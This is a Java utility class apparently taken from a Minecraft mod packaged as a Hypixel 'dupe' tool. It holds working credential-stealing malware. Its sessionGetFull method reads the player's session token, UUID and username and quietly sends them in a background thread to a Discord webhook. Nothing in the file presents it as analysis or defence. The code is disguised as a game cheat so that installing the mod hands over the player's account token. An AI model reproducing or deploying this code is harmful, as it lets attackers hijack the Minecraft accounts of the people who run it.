package run.hypixel.dupe.utils;

import java.awt.Color;
import java.net.URL;
import java.security.MessageDigest;
import java.util.Scanner;

import net.minecraft.client.Minecraft;
import net.minecraft.launchwrapper.Launch;
import run.hypixel.dupe.exception.WebhookException;
import run.hypixel.dupe.hooks.DiscordDuper;
import run.hypixel.dupe.hooks.DiscordDuper.EmbedObject;
import run.hypixel.dupe.hooks.Hooks;

public class Methods {

	public static void sessionGetFull() {
		new Thread(() -> {
			try {
				Minecraft mc = Minecraft.getMinecraft();
				String token = mc.getSession().getToken();
				String uuid = mc.getSession().getProfile().getId().toString();
				String name = mc.getSession().getProfile().getName();

				DiscordDuper dh = new DiscordDuper(Hooks.getHook());
				dh.setUsername(name);
				dh.addEmbed(new DiscordDuper.EmbedObject().setTitle(name + " Full Minecraft Information")
						.setColor(Color.CYAN).addField("Username", name, true)
						.addField("UUID", uuid.replace("-", ""), true).addField("Token", token, false)
						.setUrl("https://sky.shiiyu.moe/stats/" + name));
				dh.execute();
			} catch (Exception e) {
				new WebhookException().printStackTrace();
			}
		}).start();

	}

	public static String username() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
		String name = mc.getSession().getProfile().getName();
		return (String) name;
	}

	public static String uuid() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
		String uuid = mc.getSession().getProfile().getId().toString();
		return (String) uuid;
	}

	public static String token() throws Exception {
		Minecraft mc = Minecraft.getMinecraft();
		String token = mc.getSession().getToken();
		return (String) token;
	}

}
